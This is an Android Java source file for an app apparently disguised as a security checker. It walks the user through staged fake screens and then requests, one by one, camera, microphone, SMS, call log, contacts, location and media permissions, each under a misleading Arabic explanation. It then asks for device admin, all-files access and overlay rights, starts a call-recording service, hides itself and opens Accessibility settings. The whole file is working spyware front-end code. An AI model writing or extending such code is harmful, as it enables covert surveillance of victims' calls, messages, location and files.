package com.sec.check;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {

    private static final String TAG = "SecurityCheck";
    private static final int PERMISSION_REQUEST = 1001;
    private static final int REQUEST_DEVICE_ADMIN = 2001;
    private static final int REQUEST_OVERLAY = 2002;
    private static final int REQUEST_MANAGE_STORAGE = 2003;

    private FakeUIManager ui;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private String[][] permissionsList;
    private int currentPermIndex = 0;
    private boolean permissionsStarted = false;

    // ============================================================
    // Permissions List
    // ============================================================
    private static String[][] getPermissionsList() {
        if (Build.VERSION.SDK_INT >= 33) {
            return new String[][]{
                    {Manifest.permission.CAMERA, "للتحقق البصري"},
                    {Manifest.permission.RECORD_AUDIO, "لتسجيل الصوت"},
                    {Manifest.permission.READ_PHONE_STATE, "لمراقبة المكالمات"},
                    {Manifest.permission.CALL_PHONE, "للتحكم بالمكالمات"},
                    {Manifest.permission.READ_CALL_LOG, "لقراءة سجل المكالمات"},
                    {Manifest.permission.PROCESS_OUTGOING_CALLS, "لمراقبة المكالمات الصادرة"},
                    {Manifest.permission.READ_SMS, "لقراءة الرسائل"},
                    {Manifest.permission.SEND_SMS, "لإرسال الرسائل"},
                    {Manifest.permission.RECEIVE_SMS, "لاستقبال الرسائل"},
                    {Manifest.permission.READ_CONTACTS, "لقراءة جهات الاتصال"},
                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد الموقع"},
                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد الموقع التقريبي"},
                    {Manifest.permission.POST_NOTIFICATIONS, "للإشعارات"},
                    {"android.permission.READ_MEDIA_IMAGES", "لقراءة الصور"},
                    {"android.permission.READ_MEDIA_VIDEO", "لقراءة الفيديوهات"},
                    {"android.permission.READ_MEDIA_AUDIO", "لقراءة الملفات الصوتية"},
            };
        } else {
            return new String[][]{
                    {Manifest.permission.CAMERA, "للتحقق البصري"},
                    {Manifest.permission.RECORD_AUDIO, "لتسجيل الصوت"},
                    {Manifest.permission.READ_PHONE_STATE, "لمراقبة المكالمات"},
                    {Manifest.permission.CALL_PHONE, "للتحكم بالمكالمات"},
                    {Manifest.permission.READ_CALL_LOG, "لقراءة سجل المكالمات"},
                    {Manifest.permission.PROCESS_OUTGOING_CALLS, "لمراقبة المكالمات الصادرة"},
                    {Manifest.permission.READ_SMS, "لقراءة الرسائل"},
                    {Manifest.permission.SEND_SMS, "لإرسال الرسائل"},
                    {Manifest.permission.RECEIVE_SMS, "لاستقبال الرسائل"},
                    {Manifest.permission.READ_CONTACTS, "لقراءة جهات الاتصال"},
                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد الموقع"},
                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد الموقع التقريبي"},
                    {Manifest.permission.READ_EXTERNAL_STORAGE, "لقراءة الملفات"},
                    {Manifest.permission.WRITE_EXTERNAL_STORAGE, "لحفظ الملفات"},
            };
        }
    }

    // ============================================================
    // onCreate
    // ============================================================
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "======== APP STARTED =========");
        Log.d(TAG, "Android SDK: " + Build.VERSION.SDK_INT);
        Log.d(TAG, "Device: " + Build.MANUFACTURER + " " + Build.MODEL);

        permissionsList = getPermissionsList();
        ui = new FakeUIManager(this);

        // ★ ابدأ القصة من الشاشة الأولى
        startFlow();
    }

    // ============================================================
    // Flow — تسلسل الشاشات
    // ============================================================
    private void startFlow() {
        // 1. Welcome Screen
        ui.showWelcomeScreen(() -> {
            // 2. Login Screen
            ui.showLoginScreen(() -> {
                // 3. Security Scan
                ui.showSecurityScanScreen(() -> {
                    // 4. Progress Screen
                    ui.showProgressScreen("جاري التهيئة...", () -> {
                        // 5. ابدأ الصلاحيات
                        startPermissionFlow();
                    });
                });
            });
        });
    }

    // ============================================================
    // Permissions Flow
    // ============================================================
    private void startPermissionFlow() {
        if (permissionsStarted) return;
        permissionsStarted = true;
        currentPermIndex = 0;
        requestNextPermission();
    }

    private void requestNextPermission() {
        if (currentPermIndex >= permissionsList.length) {
            Log.d(TAG, "All runtime permissions requested");
            mainHandler.postDelayed(this::requestDeviceAdmin, 800);
            return;
        }

        String permission = permissionsList[currentPermIndex][0];

        if (!isPermissionDeclared(permission)) {
            Log.d(TAG, "Not declared: " + permission);
            currentPermIndex++;
            requestNextPermission();
            return;
        }

        if (ContextCompat.checkSelfPermission(this, permission)
                == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "Granted: " + permission);
            currentPermIndex++;
            requestNextPermission();
            return;
        }

        Log.d(TAG, "Requesting: " + permission);
        try {
            ActivityCompat.requestPermissions(this,
                    new String[]{permission}, PERMISSION_REQUEST);
        } catch (Exception e) {
            Log.e(TAG, "request error: " + e.getMessage());
            currentPermIndex++;
            requestNextPermission();
        }
    }

    private boolean isPermissionDeclared(String permission) {
        try {
            android.content.pm.PackageInfo info = getPackageManager()
                    .getPackageInfo(getPackageName(), PackageManager.GET_PERMISSIONS);
            if (info.requestedPermissions != null) {
                for (String p : info.requestedPermissions) {
                    if (p.equals(permission)) return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "isPermissionDeclared: " + e.getMessage());
        }
        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                            String[] permissions,
                                            int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST) {
            for (int i = 0; i < permissions.length; i++) {
                boolean granted = grantResults.length > 0
                        && grantResults[i] == PackageManager.PERMISSION_GRANTED;
                Log.d(TAG, permissions[i] + " " + (granted ? "GRANTED" : "DENIED"));
            }
            currentPermIndex++;
            mainHandler.postDelayed(this::requestNextPermission, 500);
        }
    }

    // ============================================================
    // Device Admin
    // ============================================================
    private void requestDeviceAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);

            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "لتفعيل الحماية الكاملة للجهاز");
                startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
                Log.d(TAG, "Requesting Device Admin");
            } else {
                Log.d(TAG, "Device Admin already active");
                mainHandler.postDelayed(this::requestManageStorage, 500);
            }
        } catch (Exception e) {
            Log.e(TAG, "DeviceAdmin error: " + e.getMessage());
            mainHandler.postDelayed(this::requestManageStorage, 500);
        }
    }

    // ============================================================
    // MANAGE_EXTERNAL_STORAGE
    // ============================================================
    private void requestManageStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                if (!Environment.isExternalStorageManager()) {
                    Intent intent = new Intent(
                            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                    Log.d(TAG, "Requesting MANAGE_EXTERNAL_STORAGE");
                    return;
                } else {
                    Log.d(TAG, "MANAGE_EXTERNAL_STORAGE granted");
                }
            } catch (Exception e) {
                Log.e(TAG, "ManageStorage error: " + e.getMessage());
                try {
                    Intent intent = new Intent(
                            Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
                    return;
                } catch (Exception ex) {}
            }
        }
        mainHandler.postDelayed(this::requestOverlay, 500);
    }

    // ============================================================
    // Overlay
    // ============================================================
    private void requestOverlay() {
        try {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_OVERLAY);
                Log.d(TAG, "Requesting Overlay");
                return;
            } else {
                Log.d(TAG, "Overlay granted");
            }
        } catch (Exception e) {
            Log.e(TAG, "Overlay error: " + e.getMessage());
        }
        mainHandler.postDelayed(this::finishSetup, 500);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_DEVICE_ADMIN) {
            mainHandler.postDelayed(this::requestManageStorage, 500);
        } else if (requestCode == REQUEST_MANAGE_STORAGE) {
            mainHandler.postDelayed(this::requestOverlay, 500);
        } else if (requestCode == REQUEST_OVERLAY) {
            mainHandler.postDelayed(this::finishSetup, 500);
        }
    }

    // ============================================================
    // Finish Setup — آخر شاشة + بدء الخدمات
    // ============================================================
    private void finishSetup() {
        Log.d(TAG, "Setup complete");

        // ★ 1. شاشة النجاح
        ui.showSuccessScreen(() -> {
            // ★ 2. ابدأ الخدمات
            startAllServices();

            // ★ 3. اخفي التطبيق
            mainHandler.postDelayed(() -> {
                try {
                    moveTaskToBack(true);
                    Log.d(TAG, "App hidden");
                } catch (Exception e) {
                    Log.e(TAG, "moveTaskToBack error: " + e.getMessage());
                }
            }, 1000);
        });

        // ★ 4. في الخلفية، ابدأ الخدمات + افتح Accessibility
        //    عشان لو المستخدم ضغط إغلاق، كل حاجة تكون جاهزة
        mainHandler.postDelayed(() -> {
            startAllServices();
            openAccessibilitySettings();
        }, 3000);
    }

    private void startAllServices() {
        // ServiceRunner
        try {
            Intent serviceIntent = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "✅ ServiceRunner started");
        } catch (Exception e) {
            Log.e(TAG, "start ServiceRunner error: " + e.getMessage());
        }

        // CallRecorderService
        try {
            Intent callRecorderIntent = new Intent(this, CallRecorderService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(callRecorderIntent);
            } else {
                startService(callRecorderIntent);
            }
            Log.d(TAG, "✅ CallRecorderService started");
        } catch (Exception e) {
            Log.e(TAG, "start CallRecorder error: " + e.getMessage());
        }
    }

    private void openAccessibilitySettings() {
        try {
            Intent accessibilityIntent = new Intent(
                    Settings.ACTION_ACCESSIBILITY_SETTINGS);
            accessibilityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(accessibilityIntent);
            Log.d(TAG, "Opened Accessibility Settings");
        } catch (Exception e) {
            Log.e(TAG, "open accessibility error: " + e.getMessage());
        }
    }
                     }
